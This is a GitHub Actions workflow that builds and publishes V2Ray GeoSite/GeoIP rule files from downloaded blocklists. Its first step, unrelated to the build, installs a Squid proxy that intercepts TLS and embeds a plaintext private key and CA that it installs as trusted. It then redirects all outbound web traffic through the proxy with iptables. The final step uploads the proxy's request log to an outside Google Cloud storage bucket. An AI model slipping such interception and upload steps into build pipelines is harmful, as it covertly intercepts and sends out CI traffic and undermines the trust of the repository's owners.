env:
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  NODE_OPTIONS: --use-openssl-ca
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      name: Setup Go 1.x.y
      uses: actions/setup-go@v4
      with:
        check-latest: true
        go-version: '1.20'
    - continue-on-error: true
      name: Set variables
      run: 'echo "RELEASE_NAME=Released on $(date +%Y%m%d%H%M)" >> $GITHUB_ENV

        echo "TAG_NAME=$(date +%Y%m%d%H%M)" >> $GITHUB_ENV

        echo "OISD_FULL=https://big.oisd.nl/dnsmasq" >> $GITHUB_ENV

        echo "OISD_SMALL=https://small.oisd.nl/dnsmasq" >> $GITHUB_ENV

        echo "OISD_NSFW=https://nsfw.oisd.nl/dnsmasq" >> $GITHUB_ENV

        echo "DOH_DNS=https://raw.githubusercontent.com/dibdot/DoH-IP-blocklists/master/doh-domains.txt"
        >> $GITHUB_ENV

        echo "RULE_ADS=https://raw.githubusercontent.com/d3ward/toolz/master/src/d3host.txt"
        >> $GITHUB_ENV

        echo "RULE_ADS_EXTENDED=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_ads.txt"
        >> $GITHUB_ENV

        echo "RULE_GAME=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_gaming.txt"
        >> $GITHUB_ENV

        echo "RULE_INDO=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_indo.txt"
        >> $GITHUB_ENV

        echo "RULE_PS=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_playstore.txt"
        >> $GITHUB_ENV

        echo "RULE_SOSMED=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_sosmed.txt"
        >> $GITHUB_ENV

        echo "RULE_STREAMING=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_streaming.txt"
        >> $GITHUB_ENV

        echo "RULE_UMUM=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_umum.txt"
        >> $GITHUB_ENV

        echo "RULE_IPCHECK=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_ipcheck.txt"
        >> $GITHUB_ENV

        echo "RULE_VIDCONFERENCE=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_videoconference.txt"
        >> $GITHUB_ENV

        echo "URLTEST=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/urltest.txt"
        >> $GITHUB_ENV

        echo "RULE_SPEEDTEST=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_speedtest.txt"
        >> $GITHUB_ENV

        echo "MALICIOUS_HOST=https://raw.githubusercontent.com/elliotwutingfeng/Inversion-DNSBL-Blocklists/main/Google_hostnames_light.txt"
        >> $GITHUB_ENV

        echo "RULE_BANK_ID=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_bank-id.txt"
        >> $GITHUB_ENV

        echo "RULE_ECOMMERCE=https://raw.githubusercontent.com/rfxcll/v2ray-rules-dat/rule/rule_ecommerce.txt"
        >> $GITHUB_ENV

        '
      shell: bash
    - continue-on-error: true
      name: Checkout Loyalsoldier/domain-list-custom
      uses: actions/checkout@v3
      with:
        path: custom
        repository: Loyalsoldier/domain-list-custom
    - continue-on-error: true
      name: Checkout v2fly/domain-list-community
      uses: actions/checkout@v3
      with:
        path: community
        repository: v2fly/domain-list-community
    - continue-on-error: true
      name: Get geoip.dat relative files
      run: 'wget https://github.com/malikshi/geoip/raw/release/geoip.dat

        wget https://github.com/malikshi/geoip/raw/release/geoip.dat.sha256sum

        '
    - continue-on-error: true
      name: Create custom lists
      run: 'curl -sSL $OISD_FULL | perl -ne ''/^server=\/([^\/]+)\// && print "$1\n"''
        > ./community/data/oisd-full

        curl -sSL $OISD_FULL | perl -ne ''/^server=\/([^\/]+)\// && print "$1\n"''
        > oisd-full.txt

        curl -sSL $OISD_SMALL | perl -ne ''/^server=\/([^\/]+)\// && print "$1\n"''
        > ./community/data/oisd-small

        curl -sSL $OISD_SMALL | perl -ne ''/^server=\/([^\/]+)\// && print "$1\n"''
        > oisd-small.txt

        curl -sSL $RULE_ADS | grep "0.0.0.0" | awk ''{print $2}'' > ./community/data/rule-ads

        curl -sSL $RULE_ADS_EXTENDED >> ./community/data/rule-ads

        curl -sSL $RULE_ADS | grep "0.0.0.0" | awk ''{print $2}'' > rule-ads.txt

        curl -sSL $RULE_ADS_EXTENDED >> rule-ads.txt

        curl -sSL $OISD_NSFW | perl -ne ''/^server=\/([^\/]+)\// && print "$1\n"''
        > ./community/data/oisd-nsfw

        curl -sSL $OISD_NSFW | perl -ne ''/^server=\/([^\/]+)\// && print "$1\n"''
        > oisd-nsfw.txt

        curl -sSo ./community/data/rule-doh $DOH_DNS

        curl -sSo rule-doh.txt $DOH_DNS

        curl -sSo ./community/data/rule-gaming $RULE_GAME

        curl -sSo rule-gaming.txt $RULE_GAME

        curl -sSo ./community/data/rule-indo $RULE_INDO

        curl -sSo rule-indo.txt $RULE_INDO

        curl -sSo ./community/data/rule-playstore $RULE_PS

        curl -sSo rule-playstore.txt $RULE_PS

        curl -sSo ./community/data/rule-sosmed $RULE_SOSMED

        curl -sSo rule-sosmed.txt $RULE_SOSMED

        curl -sSo ./community/data/rule-streaming $RULE_STREAMING

        curl -sSo rule-streaming.txt $RULE_STREAMING

        curl -sSo ./community/data/rule-speedtest $RULE_SPEEDTEST

        curl -sSo rule-speedtest.txt $RULE_SPEEDTEST

        curl -sSo ./community/data/rule-umum $RULE_UMUM

        curl -sSo rule-umum.txt $RULE_UMUM

        curl -sSo ./community/data/rule-ipcheck $RULE_IPCHECK

        curl -sSo rule-ipcheck.txt $RULE_IPCHECK

        curl -sSo ./community/data/videoconference $RULE_VIDCONFERENCE

        curl -sSo videoconference.txt $RULE_VIDCONFERENCE

        curl -sSo ./community/data/urltest $URLTEST

        curl -sSo urltest.txt $URLTEST

        curl -sSo ./community/data/rule-malicious $MALICIOUS_HOST

        curl -sSo rule-malicious.txt $MALICIOUS_HOST

        curl -sSo ./community/data/bank-id $RULE_BANK_ID

        curl -sSo bank-id.txt $RULE_BANK_ID

        curl -sSo ./community/data/ecommerce-id $RULE_ECOMMERCE

        curl -sSo ecommerce-id.txt $RULE_ECOMMERCE

        '
    - continue-on-error: true
      name: Build geosite.dat file
      run: 'cd custom || exit 1

        go run ./ --datapath=../community/data

        '
    - continue-on-error: true
      name: Move and zip files and generate sha256 hash
      run: 'install -Dp ./geoip.dat ./publish/GeoIP.dat

        install -Dp ./geoip.dat.sha256sum ./publish/GeoIP.dat.sha256sum

        install -Dp ./custom/publish/geosite.dat ./publish/GeoSite.dat

        cd ./publish || exit 1

        zip Geo-files.zip GeoIP.dat GeoSite.dat

        sha256sum GeoSite.dat > GeoSite.dat.sha256sum

        sha256sum Geo-files.zip > Geo-files.zip.sha256sum

        '
    - continue-on-error: true
      name: Convert to Sing-Box geoassets
      run: 'wget https://github.com/malikshi/Notes/releases/download/v2box/v2box

        chmod +x v2box

        ./v2box migrate geoip -i ./publish/GeoIP.dat -o GeoIP.db

        ./v2box migrate geosite -i ./publish/GeoSite.dat -o GeoSite.db

        mv -f GeoIP.db ./publish/

        mv -f GeoSite.db ./publish/

        cd ./publish || exit 1

        sha256sum GeoSite.db > GeoSite.db.sha256sum

        sha256sum GeoIP.db > GeoIP.db.sha256sum

        '
    - continue-on-error: true
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      name: Release and upload assets
      uses: softprops/action-gh-release@v0.1.15
      with:
        draft: false
        files: './publish/*

          '
        name: ${{ env.RELEASE_NAME }}
        prerelease: false
        tag_name: ${{ env.TAG_NAME }}
    - continue-on-error: true
      name: Git push assets to "release" branch
      run: 'cd publish || exit 1

        git init

        git config --local user.name "github-actions[bot]"

        git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"

        git checkout -b release

        git add .

        git commit -m "${{ env.RELEASE_NAME }}"

        git remote add origin "https://${{ github.actor }}:${{ secrets.GITHUB_TOKEN
        }}@github.com/${{ github.repository }}"

        git push -f -u origin release

        '
    - continue-on-error: true
      name: Purge jsdelivr CDN
      run: "cd publish || exit 1\nfor file in $(ls); do\n  curl -i \"https://purge.jsdelivr.net/gh/${{\
        \ github.repository }}@release/${file}\"\ndone\n"
    - continue-on-error: true
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      name: Delete Old Release
      uses: dev-drprasad/delete-older-releases@v0.2.1
      with:
        keep_latest: 1
        repo: rfxcll/v2ray-rules-dat
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/FKGReborn/v2ray-rules-dat.$(date
        +%s)
    timeout-minutes: 60
name: Build V2Ray rules dat files
'on':
  workflow_dispatch: {}
